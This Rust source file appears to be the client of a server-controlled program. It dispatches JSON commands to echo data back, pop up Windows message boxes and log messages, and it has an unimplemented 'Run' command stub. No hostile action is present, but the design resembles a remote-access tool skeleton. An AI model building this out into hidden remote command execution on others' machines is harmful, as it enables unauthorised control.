extern crate winapi;
extern crate user32;

use std::ffi::{CString};
use user32::MessageBoxA;
use winapi::um::winuser::{MB_OK, MB_ICONINFORMATION};

use lib::{Command, send_data};
use crate::Client;


pub fn parse_message(client: &mut Client, command: Command, buf: Vec<u8>) {
    // TODO: remove unwrap
    let message = serde_json::from_slice(&buf).unwrap();
    
    match command {
        Command::Run => run(client, message),
        Command::Echo => echo(client, message),
        Command::Message => display_message(client, message),
        Command::Send => receive(message),
    };
}

pub fn receive(message: String) {
    log::info!("Message received from server: {}", message);
}

pub fn run(client: &mut Client, command: String) {
    // TODO: implement command run logic
}

pub fn echo(client: &mut Client, message: String) {
    log::debug!("Received message: {}", message);
    if send_data(Command::Send, &message, &mut client.writer).is_ok() {
        log::info!("Successfully echoed data back to server");
    }
    else {
        log::error!("An error occurred while echoing data to server");
    }
}

pub fn display_message(client: &mut Client, message: String) {
    let message = CString::new(message).unwrap();
    let title = CString::new("Message").unwrap();

    unsafe {
        MessageBoxA(
            std::ptr::null_mut(),
            message.as_ptr(),
            title.as_ptr(),
            MB_OK | MB_ICONINFORMATION
        );
    }
    send_data(Command::Send, &(), &mut client.writer).unwrap();
}

pub fn message_box(title: &str, message: &str, icon_info: u32) {
    let message = CString::new(message).unwrap();
    let title = CString::new(title).unwrap();

    unsafe {
        MessageBoxA(
            std::ptr::null_mut(),
            message.as_ptr(),
            title.as_ptr(),
            icon_info
        );
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn test_message_box() {
        crate::tools::message_box("Title", "Message", winapi::um::winuser::MB_OK);
    }
}